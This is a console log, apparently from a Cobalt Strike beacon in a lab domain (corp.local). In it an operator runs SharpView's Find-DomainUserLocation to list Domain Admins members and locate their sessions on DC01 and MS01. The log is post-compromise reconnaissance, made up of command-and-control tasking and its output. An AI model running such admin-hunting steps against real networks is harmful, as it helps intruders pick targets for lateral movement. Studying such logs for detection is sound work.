```powershell
[10/19 18:00:14] beacon> execute-assembly /root/tooltesting/SharpView.exe Find-DomainUserLocation | Select-Object UserName, SessionFromName
[10/19 18:00:17] [*] Tasked beacon to run .NET program: SharpView.exe Find-DomainUserLocation | Select-Object UserName, SessionFromName
[10/19 18:00:17] [+] host called home, sent: 843949 bytes
[10/19 18:00:18] [+] received output:
[Find-DomainUserLocation] Querying for all computers in the domain

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainComputer] Get-DomainComputer filter string: (&(samAccountType=805306369))


[10/19 18:00:19] [+] received output:
[Find-DomainUserLocation] TargetComputers length: 9

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=coco,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=coco,CN=Users,DC=corp,DC=local)))

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=ned_adm,OU=Security Groups,OU=Corp,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=ned_adm,OU=Security Groups,OU=Corp,DC=corp,DC=local)))

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=iamtheadministrator,OU=Operations,OU=Corp,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=iamtheadministrator,OU=Operations,OU=Corp,DC=corp,DC=local)))

get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=Administrator,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=corp,DC=local)))

[Find-DomainUserLocation] TargetUsers length: 4

[Find-DomainUserLocation] Using threading with threads: 20

[Find-DomainUserLocation] TargetComputers length: 9

[Get-NetLoggedon] Error: Access is denied

[Get-NetLoggedon] Error: Access is denied

[Get-NetLoggedon] Error: Access is denied

[Get-NetSession] Error: The operation completed successfully

[Get-NetLoggedon] Error: Access is denied

[Get-NetSession] Error: Access is denied

[Get-NetLoggedon] Error: Access is denied

UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : iamtheadministrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserName                       : Administrator

ComputerName                   : DC01.corp.local

SessionFrom                    : 127.0.0.1

SessionFromName                : MS01.corp.local

LocalAdmin                     : False



UserDomain                     : corp

UserName                       : Administrator

ComputerName                   : MS01.corp.local

IPAddress                      : 172.16.1.30

LocalAdmin                     : False



UserDomain                     : CORP

UserName                       : Administrator

ComputerName                   : MS01.corp.local

IPAddress                      : 172.16.1.30

LocalAdmin                     : False

```